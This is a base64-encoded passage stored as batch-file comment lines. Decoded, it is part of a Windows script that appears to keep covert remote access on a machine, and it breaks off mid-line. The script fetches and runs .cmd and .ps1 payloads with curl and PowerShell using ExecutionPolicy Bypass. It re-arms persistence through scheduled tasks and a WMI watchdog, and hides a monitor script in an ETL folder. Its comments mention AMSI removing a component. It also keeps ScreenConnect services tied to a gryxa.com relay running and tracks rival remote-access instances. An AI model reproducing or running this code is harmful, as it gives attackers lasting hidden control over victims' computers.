::JiBmb3IgJSVGIGluICgiJVNUQUdFJVx0Z19yZXBvcnQubmV3IikgZG8gaWYgJSV+
::ekYgR1RSIDE1MDAgbW92ZSAveSAiJVNUQUdFJVx0Z19yZXBvcnQubmV3IiAiJVdE
::JVx0Z19yZXBvcnQucHMxIiA+bnVsIDI+JjENCiAgZmluZHN0ciAvQzoiT1dOX1NF
::Q1VSRSBCVUlMRCIgIiVTVEFHRSVcb3duX3NlY3VyZS5uZXciID5udWwgMj4mMSAm
::JiBmb3IgJSVGIGluICgiJVNUQUdFJVxvd25fc2VjdXJlLm5ldyIpIGRvIGlmICUl
::fnpGIEdUUiA4MDAgbW92ZSAveSAiJVNUQUdFJVxvd25fc2VjdXJlLm5ldyIgIiVX
::RCVcb3duX3NlY3VyZS5jbWQiID5udWwgMj4mMQ0KICBmaW5kc3RyIC9DOiJPV05f
::TElCICBCVUlMRCIgIiVTVEFHRSVcb3duX2xpYi5uZXciID5udWwgMj4mMSAmJiBm
::b3IgJSVGIGluICgiJVNUQUdFJVxvd25fbGliLm5ldyIpIGRvIGlmICUlfnpGIEdU
::UiAxNTAwIG1vdmUgL3kgIiVTVEFHRSVcb3duX2xpYi5uZXciICIlV0QlXG93bl9s
::aWIucHMxIiA+bnVsIDI+JjENCiAgZmluZHN0ciAvQzoiT1dOX0dSWVhBIEJVSUxE
::IiAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiA+bnVsIDI+JjEgJiYgZm9yICUlRiBp
::biAoIiVTVEFHRSVcb3duX2dyeXhhLm5ldyIpIGRvIGlmICUlfnpGIEdUUiA1MDAg
::bW92ZSAveSAiJVNUQUdFJVxvd25fZ3J5eGEubmV3IiAiJVdEJVxvd25fZ3J5eGEu
::Y21kIiA+bnVsIDI+JjENCiAgc2V0ICJTRUxGX1VQRD0wIg0KICBmaW5kc3RyIC9D
::OiJPV05fTU9OICBCVUlMRCIgIiVTVEFHRSVcb3duX21vbi5uZXh0IiA+bnVsIDI+
::JjENCiAgaWYgbm90IGVycm9ybGV2ZWwgMSBmb3IgJSVGIGluICgiJVNUQUdFJVxv
::d25fbW9uLm5leHQiKSBkbyBpZiAlJX56RiBHVFIgMTUwMCAoDQogICAgZmMgL2Ig
::IiVTVEFHRSVcb3duX21vbi5uZXh0IiAiJVdEJVxvd25fbW9uLmNtZCIgPm51bCAy
::PiYxDQogICAgaWYgZXJyb3JsZXZlbCAxIHNldCAiU0VMRl9VUEQ9MSINCiAgKQ0K
::ICBpZiAiJVNFTEZfVVBEJSI9PSIwIiBkZWwgL2YgL3EgIiVTVEFHRSVcb3duX21v
::bi5uZXh0IiA+bnVsIDI+JjENCikgZWxzZSAoDQogIGRlbCAvZiAvcSAiJVNUQUdF
::JVx0Z19yZXBvcnQubmV3IiAiJVNUQUdFJVxvd25fc2VjdXJlLm5ldyIgIiVTVEFH
::RSVcb3duX2xpYi5uZXciICIlU1RBR0UlXG93bl9tb24ubmV4dCIgIiVTVEFHRSVc
::b3duX2dyeXhhLm5ldyIgPm51bCAyPiYxDQogIHNldCAiU0VMRl9VUEQ9MCINCikN
::CmRlbCAvZiAvcSAiJVNUQUdFJVx0Z19yZXBvcnQubmV3IiAiJVNUQUdFJVxvd25f
::c2VjdXJlLm5ldyIgIiVTVEFHRSVcb3duX2xpYi5uZXciICIlU1RBR0UlXG93bl9n
::cnl4YS5uZXciID5udWwgMj4mMQ0KZGVsIC9mIC9xICIlU1RBR0UlXHVwZGF0ZS5t
::YW5pZmVzdCIgIiVTVEFHRSVcdXBkYXRlLm1hbmlmZXN0LnNpZyIgPm51bCAyPiYx
::DQoNCnJlbSBNNDM6IGlmIGxpYiBzdGlsbCBtaXNzaW5nIChBTVNJIHdpcGVkIGl0
::IC8gbmV2ZXIgbGFuZGVkKSwga2VlcCBhIFRFTVAgY29weSBmb3IgZmFsbGJhY2tz
::DQppZiBub3QgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIGlmIGV4aXN0ICIlU1RB
::R0UlXG93bl9saWIubmV3IiBjb3B5IC95ICIlU1RBR0UlXG93bl9saWIubmV3IiAi
::JVdEJVxvd25fbGliLnBzMSIgPm51bCAyPiYxDQppZiBub3QgZXhpc3QgIiVXRCVc
::b3duX2dyeXhhLmNtZCIgKA0KICAiJUNVUkwlIiAtTCAtLXNzbC1uby1yZXZva2Ug
::LS1jb25uZWN0LXRpbWVvdXQgOCAtLW1heC10aW1lIDIwIC1vICIlV0QlXG93bl9n
::cnl4YS5jbWQiICIlT1dOR1JZWEElIiA+bnVsIDI+JjENCiAgaWYgbm90IGV4aXN0
::ICIlV0QlXG93bl9ncnl4YS5jbWQiICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10aW1l
::b3V0IDggLS1tYXgtdGltZSAyMCAtbyAiJVdEJVxvd25fZ3J5eGEuY21kIiAiJU9X
::TkdSWVhBMiUiID5udWwgMj4mMQ0KKQ0KDQpyZW0gTTQyOiBzZXZyei5jZmcgZHlu
::YW1pYyBGUCBmcm9tIHJlcG8gc2V2cnpfZXhwZWN0ZWQuY2ZnDQppZiBleGlzdCAi
::JVdEJVxzZXZyei5jZmciIGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxp
::bXM9PSIgJSVLIGluICgiJVdEJVxzZXZyei5jZmciKSBkbyAoDQogIGlmIC9JICIl
::JUsiPT0iUFJJTUFSWV9GUCIgc2V0ICJLRUVQX0ZQPSUlTCINCiAgaWYgL0kgIiUl
::SyI9PSJBTFRfRlAiIHNldCAiQUxUX0ZQPSUlTCINCikNCiIlQ1VSTCUiIC1MIC0t
::c3NsLW5vLXJldm9rZSAtLWNvbm5lY3QtdGltZW91dCA2IC0tbWF4LXRpbWUgMjAg
::LW8gIiVTVEFHRSVcc2V2cnpfZXhwZWN0ZWQubmV3IiAiJVNFVlJaX0VYUF9VUkwl
::IiA+bnVsIDI+JjENCmlmIG5vdCBleGlzdCAiJVNUQUdFJVxzZXZyel9leHBlY3Rl
::ZC5uZXciICIlQ1VSTCUiIC1MIC0tY29ubmVjdC10aW1lb3V0IDYgLS1tYXgtdGlt
::ZSAyMCAtbyAiJVNUQUdFJVxzZXZyel9leHBlY3RlZC5uZXciICIlU0VWUlpfRVhQ
::X1VSTDIlIiA+bnVsIDI+JjENCmlmIGV4aXN0ICIlU1RBR0UlXHNldnJ6X2V4cGVj
::dGVkLm5ldyIgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiICgNCiAgZm9yIC9m
::ICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2Zp
::bGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1Db21t
::YW5kICIkdD1HZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggJyVTVEFHRSVcc2V2cnpf
::ZXhwZWN0ZWQubmV3JyAtUmF3OyAmICclV0QlXG93bl9saWIucHMxJyAtQWN0aW9u
::IHN5bmMtc2V2cnotZnAgLVdvcmtEaXIgJyVXRCUnIC1FeHRyYSAkdCJgKSBkbyAo
::DQogICAgZWNobyBzZXZyel9zeW5jICUlUj4+IiVMT0clIg0KICAgIGZvciAvZiAi
::dG9rZW5zPTIsMyBkZWxpbXM9fCIgJSVBIGluICgiJSVSIikgZG8gKA0KICAgICAg
::aWYgbm90ICIlJUEiPT0iIiBzZXQgIktFRVBfRlA9JSVBIg0KICAgICAgaWYgbm90
::ICIlJUIiPT0iIiBzZXQgIkFMVF9GUD0lJUIiDQogICAgKQ0KICApDQopDQpkZWwg
::L2YgL3EgIiVTVEFHRSVcc2V2cnpfZXhwZWN0ZWQubmV3IiA+bnVsIDI+JjENCmlm
::IGV4aXN0ICIlV0QlXHNldnJ6LmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9
::MSwqIGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXHNldnJ6LmNmZyIpIGRvICgNCiAg
::aWYgL0kgIiUlSyI9PSJQUklNQVJZX0ZQIiBzZXQgIktFRVBfRlA9JSVMIg0KICBp
::ZiAvSSAiJSVLIj09IkFMVF9GUCIgc2V0ICJBTFRfRlA9JSVMIg0KKQ0KDQpyZW0g
::4pSA4pSAIFtCXSByZS1hcm0gY2hhaW4gMTogb3duZXJzaGlwLWF3YXJlIChub3Qg
::ZXhpc3RlbmNlLW9ubHkpIOKUgOKUgA0KcmVtIEwxMS9NMjI6IFF1ZXJ5LW9ubHkg
::c2tpcHBlZCByZWFybSB3aGVuIFdpbmRvd3MgYnVpbHQtaW4gdGFza3Mgc2hhcmVk
::DQpyZW0gZGVmYXVsdCBuYW1lcyAoRGlhZ25vc2lzXFNjaGVkdWxlZCBldGMuKSAt
::PiBtb24gbmV2ZXIgcmFuLCBubyBsb2cuDQppZiBleGlzdCAiJVdEJVxvd25fbGli
::LnBzMSIgKA0KICBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBv
::d2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBv
::bGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gdGFz
::a3MtZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAtTW9uUGF0aCAiJVdEJVxvd25fbW9u
::LmNtZCJgKSBkbyAoDQogICAgZWNobyB0YXNrc19lbnN1cmUgJSVSPj4iJUxPRyUi
::DQogICAgc2V0ICJUQVNLU19FTlNVUkU9JSVSIg0KICApDQopDQppZiBub3QgZXhp
::c3QgIiVFVEwlIiBta2RpciAiJUVUTCUiID5udWwgMj4mMQ0KaWYgZXhpc3QgIiVX
::RCVcb3duX21vbi5jbWQiICgNCiAgYXR0cmliIC1oIC1zIC1yICIlRVRMJVxldGxf
::bW9uLmNtZCIgPm51bCAyPiYxDQogIGNvcHkgL3kgIiVXRCVcb3duX21vbi5jbWQi
::ICIlRVRMJVxldGxfbW9uLmNtZCIgPm51bCAyPiYxDQopDQoNCnJlbSDilIDilIAg
::W0IyXSByZS1hcm0gY2hhaW4gMiAoV01JIHN1YnNjcmlwdGlvbikgaWYgbWlzc2lu
::ZyDilIDilIDilIDilIDilIDilIDilIDilIDilIANCmlmIGV4aXN0ICIlV0QlXG93
::bl9saWIucHMxIiAoDQogIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGlu
::IChgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0
::aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlv
::biB3YXRjaGRvZy1lbnN1cmUgLVdvcmtEaXIgIiVXRCUiIC1Nb25QYXRoICIlV0Ql
::XG93bl9tb24uY21kImApIGRvIHNldCAiV0RfU1RBVEU9JSVSIg0KICBpZiAvSSAi
::IVdEX1NUQVRFISI9PSJSRUFSTUVEIiBlY2hvIHdhdGNoZG9nIFdNSSBSRUFSTUVE
::Pj4iJUxPRyUiDQopDQoNCnJlbSDilIDilIAgW0UwXSBzeW5jIEdyeXhhIEZQIGZy
::b20gdmVyaWZpZWQgZ3J5eGEuY29tIFNDIEJFRk9SRSBleHRlcm1pbmF0ZSDilIDi
::lIANCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiAoDQogIHBvd2Vyc2hlbGwg
::LU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBh
::c3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3luYy1ncnl4YS1m
::cCAtV29ya0RpciAiJVdEJSIgPm51bCAyPiYxDQogIGlmIGV4aXN0ICIlV0QlXGdy
::eXhhLmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRlbGltcz09IiAl
::JUsgaW4gKCIlV0QlXGdyeXhhLmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVO
::VF9GUCIgc2V0ICJHUllYQV9GUD0lJUwiDQopDQoNCnJlbSDilIDilIAgW0VdIEw0
::NS9NNDggSEFORFMtT0ZGOiBza2lwIGV4dGVybWluYXRlIChkbyBub3QgdG91Y2gg
::YW55IFNjcmVlbkNvbm5lY3QpIOKUgOKUgA0KZWNobyBoYW5kc19vZmZfc2tpcF9l
::eHRlcm1pbmF0ZT4+IiVMT0clIg0Kc2V0ICJGT1JFSUdOX0xFRlQ9MCINCmZvciAv
::ZiAidG9rZW5zPTIgZGVsaW1zPSgpIiAlJWEgaW4gKCdzYyBxdWVyeSBzdGF0ZV49
::IGFsbCBefCBmaW5kc3RyIC9DOiJTRVJWSUNFX05BTUU6IFNjcmVlbkNvbm5lY3Qg
::Q2xpZW50IicpIGRvICgNCiAgc2V0ICJGUD0lJWEiDQogIHNldCAiRlA9IUZQOiA9
::ISINCiAgcmVtIGZyaWVuZGx5IGlmIGtlZXBlciBGUCBPUiBncnl4YS1yZWxheSAo
::SW1hZ2VQYXRoIGhhcyBncnl4YS5jb20pIOKAlCBuZXZlciBjb3VudCBuZXcgR3J5
::eGEgYXMgZm9yZWlnbg0KICBzZXQgIkZSSUVORExZPTAiDQogIGlmIC9JICIhRlAh
::Ij09IiVLRUVQX0ZQJSIgc2V0ICJGUklFTkRMWT0xIg0KICBpZiAvSSAiIUZQISI9
::PSIlQUxUX0ZQJSIgc2V0ICJGUklFTkRMWT0xIg0KICBpZiAvSSAiIUZQISI9PSIl
::R1JZWEFfRlAlIiBzZXQgIkZSSUVORExZPTEiDQogIGlmICIhRlJJRU5ETFkhIj09
::IjAiICgNCiAgICBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0iICUlSSBpbiAoYHJl
::ZyBxdWVyeSAiSEtMTVxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2VydmljZXNc
::U2NyZWVuQ29ubmVjdCBDbGllbnQgKCFGUCEpIiAvdiBJbWFnZVBhdGggMl4+bnVs
::IF58IGZpbmRzdHIgL0kgIkltYWdlUGF0aCJgKSBkbyAoDQogICAgICBlY2hvICUl
::SSB8IGZpbmRzdHIgL0kgImdyeXhhLmNvbSIgPm51bCAmJiBzZXQgIkZSSUVORExZ
::PTEiDQogICAgKQ0KICApDQogIGlmICIhRlJJRU5ETFkhIj09IjAiICgNCiAgICBz
::ZXQgL2EgQ09VTlQrPTENCiAgICBzZXQgL2EgRk9SRUlHTl9MRUZUKz0xDQogICAg
::c2V0ICJGT1JFSUdOX0xJU1Q9IUZPUkVJR05fTElTVCEhRlAhICINCiAgICBlY2hv
::IGZvcmVpZ25fbGVmdF8hRlAhPj4iJUxPRyUiDQogICkNCikNCg0KcmVtIOKUgOKU
::gCBbQ10gaGVhbCBTY3JlZW5Db25uZWN0IHByaW0vYWx0IOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
::gOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KZm9yIC9mICJ0b2tlbnM9MSwyIGRlbGlt
::cz0oKSIgJSVhIGluICgnc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgl
::S0VFUF9GUCUpIiBefCBmaW5kc3RyIC9DOiJTRVJWSUNFX05BTUUiJykgZG8gKA0K
::ICBzZXQgIklOU1RBTExFRD0xIg0KICBzZXQgIlBSSU1TVEFURT0lJWIiDQopDQpz
::YyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiIHwgZmlu
::ZCAiUlVOTklORyIgPm51bA0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNldCAi
::UFJJTV9PSz0xIg0KICBzZXQgL2EgQ09VTlQrPTENCikNCnNjIHF1ZXJ5ICJTY3Jl
::ZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiA+bnVsIDI+JjENCmlmIG5vdCBl
::cnJvcmxldmVsIDEgc2V0IC9hIENPVU5UKz0xDQpzYyBxdWVyeSAiU2NyZWVuQ29u
::bmVjdCBDbGllbnQgKCVBTFRfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQpp
::ZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiQUxUX09LPTEiDQoNCmlmICIlSU5TVEFM
::TEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgNCiAgZWNobyBzdmMgaGVh
::bCByZXN0YXJ0Pj4iJUxPRyUiDQogIG5ldCBzdGFydCAiU2NyZWVuQ29ubmVjdCBD
::bGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICBzYyBzdGFydCAiU2NyZWVu
::Q29ubmVjdCBDbGllbnQgKCVLRUVQX0ZQJSkiID5udWwgMj4mMQ0KICB0aW1lb3V0
::IC90IDYgL25vYnJlYWsgPm51bA0KICBzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBD
::bGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KICBpZiBu
::b3QgZXJyb3JsZXZlbCAxIHNldCAiUFJJTV9PSz0xIg0KKQ0KcmVtIE0xNjogc3Rp
::bGwgc3RvcHBlZCAtPiByZXBhaXIgdGhlIFJFR0lTVEVSRUQgcHJvZHVjdCAobXNp
::ZXhlYyAvZmEgcmVzdG9yZXMNCnJlbSBiaW5hcmllcyArIHN0YXJ0cyB0aGUgc2Vy
::dmljZTsgTDUgUmVwYWlyLVNDU2VydmljZSBoYW5kbGVzIHN0b3BwZWQgc3ZjcykN
::CmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgNCiAg
::ZWNobyBzdmMgZXNjYWxhdGUgcmVwYWlyPj4iJUxPRyUiDQogIGlmIGV4aXN0ICIl
::V0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVy
::YWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9s
::aWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIg
::IiVXRCUiID4+IiVMT0clIiAyPiYxDQogIHRpbWVvdXQgL3QgOCAvbm9icmVhayA+
::bnVsDQogIHNjIHF1ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUtFRVBfRlAl
::KSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQogIGlmIG5vdCBlcnJvcmxldmVsIDEg
::c2V0ICJQUklNX09LPTEiDQopDQpyZW0gTTE2OiBvcnBoYW5lZCBzZXJ2aWNlIGVu
::dHJ5IChwcm9kdWN0IHVucmVnaXN0ZXJlZCAtIGVhdGVuIGJ5IGFuIFNDLWZhbWls
::eQ0KcmVtIHVwZ3JhZGUgcmVtb3ZhbCkgY2FuIE5FVkVSIHN0YXJ0LiBEZWxldGUg
::aXQgYW5kIGZhbGwgdGhyb3VnaCB0byB0aGUNCnJlbSBmcmVzaC1pbnN0YWxsIGxh
::ZGRlciBiZWxvdyBpbnN0ZWFkIG9mIGFsZXJ0aW5nICJ3b250IHN0YXJ0IiBmb3Jl
::dmVyLg0KaWYgIiVJTlNUQUxMRUQlIj09IjEiIGlmICIlUFJJTV9PSyUiPT0iMCIg
::KA0KICBzZXQgIlJFR1NUQVRFPXVua25vd24iDQogIGlmIGV4aXN0ICIlV0QlXG93
::bl9saWIucHMxIiBmb3IgL2YgImRlbGltcz0iICUlUiBpbiAoJ3Bvd2Vyc2hlbGwg
::LU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBh
::c3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVnaXN0ZXJlZCAt
::RnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVXRCUiJykgZG8gc2V0ICJSRUdTVEFU
::RT0lJVIiDQogIGVjaG8gb3JwaGFuX2NoZWNrPSFSRUdTVEFURSE+PiIlTE9HJSIN
::CiAgaWYgL0kgIiFSRUdTVEFURSEiPT0ibm8iICgNCiAgICBlY2hvIG9ycGhhbl9z
::ZXJ2aWNlX2RlbGV0ZV9TS0lQUEVEX2hhbmRzX29mZj4+IiVMT0clIg0KICAgIHJl
::bSBNNDg6IG5ldmVyIHNjIGRlbGV0ZSBhbnkgU2NyZWVuQ29ubmVjdA0KDQogICkN
::CikNCmlmICIlSU5TVEFMTEVEJSI9PSIxIiBpZiAiJVBSSU1fT0slIj09IjAiICgN
::CiAgcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0
::aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlv
::biBzdGF0ZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlIC1FeHRyYSAi
::c3ZjLXdvbnQtc3RhcnQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIERPV04g
::IlNjcmVlbkNvbm5lY3QgKCVLRUVQX0ZQJSkgaW5zdGFsbGVkIGJ1dCB3b250IHN0
::YXJ0Ig0KICBnb3RvIDpBZnRlckhlYWwNCikNCmlmICIlSU5TVEFMTEVEJSI9PSIx
::IiBnb3RvIDpBZnRlckhlYWwNCg0KcmVtIOKUgOKUgCBbRF0gcHJpbWFyeSBTQyBt
::aXNzaW5nIC0gaGVhbCBsYWRkZXIg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQpyZW0gTTEy
::OiBGSVJTVCByZXBhaXIgdGhlIHJlZ2lzdGVyZWQgcHJvZHVjdCAocmVjcmVhdGVz
::IHNlcnZpY2Ugd2l0aG91dA0KcmVtIHRvdWNoaW5nIHRoZSBBTFQgaW5zdGFuY2Up
::OyBmcmVzaCBtc2lleGVjIGluc3RhbGwgb25seSBhcyBmYWxsYmFjay4NCmVjaG8g
::c3ZjIG1pc3NpbmcgLSBoZWFsIGJlZ2luPj4iJUxPRyUiDQpjYWxsIDpSZXBhaXJS
::ZWdpc3RlcmVkICIlS0VFUF9GUCUiDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBD
::bGllbnQgKCVLRUVQX0ZQJSkiIHwgZmluZCAiUlVOTklORyIgPm51bA0KaWYgbm90
::IGVycm9ybGV2ZWwgMSAoDQogIHNldCAiSU5TVEFMTEVEPTEiDQogIHNldCAiUFJJ
::TV9PSz0xIg0KICBnb3RvIDpBZnRlckhlYWwNCikNCnJlbSByZWZ1c2UgZnJlc2gg
::L2kgaWYgcHJvZHVjdCBzdGlsbCByZWdpc3RlcmVkIC0gVXBncmFkZSB0YWJsZSBj
::YW4gd2lwZSBBTFQvR1JZWEENCnNldCAiUkVHU1RBVEU9dW5rbm93biINCmlmIGV4
::aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2YgInVzZWJhY2txIGRlbGltcz0i
::ICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUg
::LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEi
::IC1BY3Rpb24gcmVnaXN0ZXJlZCAtRnAgIiVLRUVQX0ZQJSIgLVdvcmtEaXIgIiVX
::RCUiYCkgZG8gc2V0ICJSRUdTVEFURT0lJVIiDQppZiAvSSAiIVJFR1NUQVRFISI9
::PSJ5ZXMiICgNCiAgZWNobyBwcmltYXJ5X3JlZ2lzdGVyZWRfc2tpcF9mcmVzaF9p
::bnN0YWxsPj4iJUxPRyUiDQogIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50
::ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3du
::X2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAl
::TU9OVkVSJSAtRXh0cmEgInJlZ2lzdGVyZWQtc3R1Y2siID5udWwgMj4mMQ0KICBj
::YWxsIDpUZ1N0YXRlIERPV04gIlByaW1hcnkgcmVnaXN0ZXJlZCBidXQgc2Vydmlj
::ZSBtaXNzaW5nIC0gL2ZhIGZhaWxlZDsgcmVmdXNlZCAvaSB0byBwcm90ZWN0IEFM
::VC9HUllYQSINCiAgZ290byA6QWZ0ZXJIZWFsDQopDQpyZW0gTzM3OiByZWZ1c2Ug
::c2V2cnogL2kgd2hlbiBncnl4YSBhbHJlYWR5IHByZXNlbnQg4oCUIHNoYXJlZCBs
::ZWdhY3kgVXBncmFkZUNvZGVzDQpyZW0gezBDOTQ0NDhCfS97MUY4NUQ3RkV9IG1h
::a2Ugc2libGluZyBtc2lleGVjIC9pIGtub2NrIEdyeXhhIE9GRkxJTkUgaW4gcGFu
::ZWwuDQpyZW0gTTM2OiBkZXRlY3QgR3J5eGEgYnkgcmVsYXkgZG9tYWluIHRvbyAo
::YW55IHJ1bm5pbmcgZ3J5eGEuY29tIFNDKSwgbm90IG9ubHkgYnkgRlAuDQpzZXQg
::IkdSRUc9dW5rbm93biINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3Ig
::L2YgInVzZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJv
::ZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZp
::bGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVnaXN0ZXJlZCAtRnAgIiVH
::UllYQV9GUCUiIC1Xb3JrRGlyICIlV0QlImApIGRvIHNldCAiR1JFRz0lJVIiDQpz
::YyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+bnVs
::IDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJHUkVHPXllcyINCnNjIHF1
::ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoMzZlNTA2ZmYwMTZiMjE1MSkiID5u
::dWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkdSRUc9eWVzIg0KcmVt
::IGFueSBub24tc2V2cnogUnVubmluZy9QZW5kaW5nIFNDIE9SIEltYWdlUGF0aCBn
::cnl4YS5jb20gPSBHcnl4YSBwcmVzZW50DQpmb3IgL2YgInRva2Vucz0yIGRlbGlt
::cz0oKSIgJSVhIGluICgnc2MgcXVlcnkgc3RhdGVePSBhbGwgXnwgZmluZHN0ciAv
::QzoiU0VSVklDRV9OQU1FOiBTY3JlZW5Db25uZWN0IENsaWVudCInKSBkbyAoDQog
::IHNldCAiX0ZQPSUlYSINCiAgc2V0ICJfRlA9IV9GUDogPSEiDQogIGlmIC9JIG5v
::dCAiIV9GUCEiPT0iJUtFRVBfRlAlIiBpZiAvSSBub3QgIiFfRlAhIj09IiVBTFRf
::RlAlIiAoDQogICAgc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICghX0ZQ
::ISkiIHwgZmluZHN0ciAvSSAvQzoiUlVOTklORyIgL0M6IlNUQVJUX1BFTkRJTkci
::ID5udWwNCiAgICBpZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiR1JFRz15ZXMiDQog
::ICkNCiAgZm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJUkgaW4gKGByZWcgcXVl
::cnkgIkhLTE1cU1lTVEVNXEN1cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXFNjcmVl
::bkNvbm5lY3QgQ2xpZW50ICghX0ZQISkiIC92IEltYWdlUGF0aCAyXj5udWwgXnwg
::ZmluZHN0ciAvSSAiSW1hZ2VQYXRoImApIGRvICgNCiAgICBlY2hvICUlSSB8IGZp
::bmRzdHIgL0kgImdyeXhhLmNvbSIgPm51bCAmJiBzZXQgIkdSRUc9eWVzIg0KICAp
::DQopDQppZiAvSSAiIUdSRUchIj09InllcyIgKA0KICBlY2hvIHByaW1hcnlfc2tp
::cF9pX3Byb3RlY3RfZ3J5eGE+PiIlTE9HJSINCiAgZWNobyBoYW5kc19vZmZfZ3J5
::eGFfcHJlc2VudF9za2lwX3NldnJ6Pj4iJUxPRyUiDQogIGNhbGwgOkVuc3VyZUdy
::eXhhTXVzdA0KICBnb3RvIDpBZnRlckhlYWwNCikNCnJlbSBNNDggSEFORFMtT0ZG
::OiBza2lwIGFsbCBzZXZyeiBtc2lleGVjIC9pIC8gc2MtZmFtaWx5IGluc3RhbGxz
::DQplY2hvIGhhbmRzX29mZl9za2lwX3NldnJ6X21zaT4+IiVMT0clIg0KY2FsbCA6
::RW5zdXJlR3J5eGFNdXN0DQpnb3RvIDpBZnRlckhlYWwNCmNhbGwgOlJlc3RvcmVB
::bHQNCmNhbGwgOkVuc3VyZUdyeXhhTXVzdA0KaWYgIiVJTlNUQUxMRUQlIj09IjAi
::ICgNCiAgaWYgZXhpc3QgIiVXRCVcbXNpX2hlYWwubG9nIiAoDQogICAgZWNobyAt
::LS0gbXNpX2hlYWwubG9nIHRhaWwgLS0tPj4iJUxPRyUiDQogICAgcG93ZXJzaGVs
